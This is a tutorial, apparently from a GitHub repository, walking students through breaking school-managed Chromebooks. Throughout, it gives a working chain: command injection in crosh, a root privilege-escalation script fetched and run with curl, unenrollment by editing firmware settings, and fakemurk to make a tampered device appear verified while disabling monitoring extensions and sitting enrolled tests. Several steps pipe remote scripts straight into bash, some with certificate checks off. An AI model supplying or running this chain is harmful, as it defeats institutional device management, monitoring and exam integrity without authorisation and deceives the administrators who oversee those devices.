# The ultimate exploit guide

For this set of exploits, you will need one (or two, if you want to use the unenrollment exploit easily) 8gb or larger USB drive(s), and a chromebook with a board that's either on chrome100 or cros.tech (or, if you're unlucky enough to be on `kindred`, see [here](https://rainestorme.github.io/chrome81/kindred)). There's no need to have your chromebook be compatible with sh1mmer, because this exploit uses only recovery images and traditional exploits.

If you're using one USB drive, then flash it with a copy of ChromeOS 81 for your chromebook's board. If you're using two drives, flash the first one with the same file. If this isn't your first time running this exploit, then you should already have the required recovery drives.

Plug your cros 81 drive into your chromebook and press `Esc+Refresh+Power`. Wait for the process to finish, then reboot and log in as normal, with your school account. Press `Ctrl+Alt+T`. If crosh opens, you can proceed to the next step. Otherwise, use LtBEEF or some other extension-removal exploit to disable whatever extension might be blocking crosh.

Inside of crosh, type in `set_cellular_ppp \';bash;exit;\'`. You should be dropped into a bash prompt. We now have to run a privelige escalation exploit, which is also hosted in this repo (https://github.com/rainestorme/resources/tree/main/80.sh). Run: `bash <(curl https://raw.githubusercontent.com/rainestorme/resources/main/80.sh)` and wait for it to finish.

You should be dropped into a *root* bash prompt (please, please, hold your applause). You now have two choices. You can:

- Unenroll your Chromebook, and, optionally, fakemurk it so that it appears to be verified

     or

- Leave your Chromebook in verified mode and run cedr

## Unenrollment, fakemurk, and murkmod

If you want to unenroll your Chromebook, just run: `vpd -i RW_VPD -s check_enrollment=0`. From there, press `Esc+Refresh+Power` and press `Ctrl+D`. Press enter, then wait for the chromebook to reboot. Press `Ctrl+D` if a screen shows up about verification being off, and wait for the chromebook to reboot in verified mode. All data should be cleared, and your chromebook will be unenrolled. You can setup your chromebook as normal, and sign in with a home account.

To fakemurk your Chromebook, you have to be unenrolled first. Update your Chromebook (it'll only update to v105) and press `Esc+Refresh+Power`. Press `Ctrl+D`, then enter. Wait the 5 minutes for your Chromebook to enter developer mode, then proceed with typical setup. When you get logged in, press `Ctrl+Alt+T` and type `shell`.

Before you do anything else, however, you need to set up some failsafes. Fakemurk in general is pretty tempramental, and if you mess something up you could easily destroy your installation of ChromeOS. Grab the USB drive you used earlier, or grab the second USB drive if you're using two drives. Install the Chromebook Recovery Tool from the chrome webstore and flash the drive with a v105 image, Just In Case You Fuck It Up™.

We're also going to install MrChromeBox's RW_LEGACY firmaware. Run:

```sh
cd; curl -LOk mrchromebox.tech/firmware-util.sh && sudo bash firmware-util.sh
```

And then press `1` and then enter. Wait for it to finish and proceed with the next step, running:

```sh
sudo su
bash <(curl -SLk https://github.com/MercuryWorkshop/fakemurk/releases/latest/download/fakemurk.sh)
```

If the last command errors, press `Esc+Refresh+Power` and recover your chromebook with the v105 drive to try again. Keep trying until it works.

Follow the instructions (be sure to respond "Y" for emergency backups, they're useful in a pinch) and wait for your Chromebook to reboot. Once it reboots, press `Ctrl+D` to continue the boot process. Wait for your Chromebook to enroll. If everything works correctly (as it rarely does) then you should be enrolled as normal, but will have the fakemurk components installed on your device. If enrollment takes a while and then complains about a missing certificate, don't panic! This is normal. Just press `Refresh+Power` and wait for the warning to pop up. Instead of pressing `Ctrl+D`, press space and enter to **disable developer mode**. **Immediately after pressing these keys, press `Refresh+Power`**. This will result in a "ChromeOS is missing or damaged" screen. Once again, this is supposed to happen. Press `Esc+Refresh+Power` and `Ctrl+D` again, **re-enabling developer mode**. There's no five-minute wait this time around, because the rootfs is already unverified and doesn't need to be changed. When you get back to the warning, press `Ctrl+D` to boot. Try to enroll now, and after a short wait, it should work. 

You should be able to use your Chromebook as an enrolled device, take enrolled tests, and do a ton of other fun things. Sometime in the future, I plan to release a tool allowing the opening of extra browser tabs during kiosk tests (because I know you skids would love that), but that's irrellevant.

Open up crosh (`Ctrl+Alt+T`). You might notice that it's been replaced by "mush", the fakemurk replacement for crosh. You can do a lot from here, but a few key options stand out. Obviously, you want to disable certain extensions, such as GoGuardian, Gopher Buddy and Securly. I don't personally reccomend using "Soft Disable Extensions", as it uses a lot of CPU. It's much easier to hard disable extensions and re-enable them later.

One of my favorite capabilities of fakemurk is to run an entire linux desktop environment side-by-side ChromeOS with Crouton. Select the option and wait for it to download the chroot environment to the device. Once you set a password and install the desktop, you can drop into a root bash shell and type `startxfce4` to start the crouton desktop. While you're running the desktop, you can press `Ctrl+Shift+Forward` and `Ctrl+Shift+Back` to get back and forth between the desktop environments.

Policies are also modified, courtesy of Pollen. You can do a lot of things that are normally restricted, such as accessing the webstore and downloading extensions, and installing unsigned apks.

You also have the option of installing murkmod, a project that allows you to install plugins for mush, fakemurk's replacement for crosh. To do so, open a root shell and run the following:

```sh
bash <(curl -SLk https://raw.githubusercontent.com/rainestorme/murkmod/main/murkmod.sh)
```

## Cedr

Cedr is my own little pet project, allowing you to run Crouton on an enrolled Chromebook. The issue with Cedr is that it requires an external drive to store the chroot on. I reccomend using a MicroSD card for chroot storage, but a USB drive can also be used.

Insert the storage device (USB drive/MicroSD card) and find its block device. Run `fdisk -l` and try to identify the device you plugged in.

Cedr allows you to choose any desktop supported by Crouton in this step, but for the sake of simplicity I'll go with xfce4 for this tutorial. Run the following commands, replacing `/dev/sdX` with the block device representing your storage device:

```sh
curl https://raw.githubusercontent.com/rainestorme/cedr/main/cedr-bootstrap.sh | bash -s /dev/sdX xfce
bash <(curl http://raw.githubusercontent.com/rainestorme/cedr/main/cedr-umount.sh)
```

The drive should be unmounted automatically, and you can remove it.

To activate the desktop environment, you can plug in the device and identify its block device again (as above), or, if you never unplugged it from the last step, use the same one. Run:

```sh
curl https://raw.githubusercontent.com/rainestorme/cedr/main/cedr-mount.sh | bash -s /dev/sdX
```

You can freely swap back and forth between ChromeOS and Cedr at will. Once you're finished, log out of your session and run:

```sh
bash <(curl http://raw.githubusercontent.com/rainestorme/cedr/main/cedr-umount.sh)
```
